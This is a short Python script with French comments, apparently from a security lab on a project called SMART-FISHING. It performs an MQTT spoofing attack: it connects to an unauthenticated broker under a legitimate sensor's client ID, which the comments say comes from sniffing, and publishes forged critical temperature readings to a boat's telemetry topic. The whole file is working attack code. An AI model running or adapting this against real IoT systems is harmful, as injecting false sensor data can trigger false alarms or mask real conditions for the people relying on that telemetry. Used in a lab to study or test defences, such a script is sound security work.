#!/usr/bin/env python3
"""
Script de Spoofing MQTT — SMART-FISHING
Usurpe l'identité d'un capteur légitime et publie de fausses données
"""

import paho.mqtt.client as mqtt
import json
import time
import random

# Configuration du broker vulnérable
BROKER = "localhost"
PORT = 1883

# Identifiants du capteur légitime (à adapter après sniffing)
CLIENT_ID = "capteur_TEMP_001"
TOPIC = "fishing/boat/ABJ-001/temperature"

def on_connect(client, userdata, flags, rc):
    """Callback lors de la connexion au broker"""
    if rc == 0:
        print(f"[+] Connecté au broker avec Client ID: {CLIENT_ID} ✅")
        print("[*] Spoofing en cours...")
    else:
        print(f"[-] Échec de connexion, code: {rc}")

def on_disconnect(client, userdata, rc):
    print("[+] Déconnecté du broker")

def on_publish(client, userdata, mid):
    print(f"[+] Message {mid} publié ✅")

# Créer le client avec le Client ID usurpé
client = mqtt.Client(client_id=CLIENT_ID)
client.on_connect = on_connect
client.on_disconnect = on_disconnect
client.on_publish = on_publish

# Se connecter
print("[*] Tentative de spoofing...")
client.connect(BROKER, PORT, 60)
client.loop_start()
time.sleep(1)

# Publier 5 messages falsifiés
print("\n[*] Publication de 5 messages falsifiés...")
for i in range(5):
    payload = {
        "capteur_id": "TEMP-001",
        "valeur": round(random.uniform(40.0, 45.0), 2),  # Température anormale
        "unite": "C",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "alerte": "CRITIQUE",
        "source": "spoofing"
    }
    client.publish(TOPIC, json.dumps(payload))
    print(f"[{i+1}/5] Publié: {payload['valeur']}°C (alerte critique)")
    time.sleep(2)

client.loop_stop()
client.disconnect()
print("\n[+] Attaque de spoofing terminée ✅")
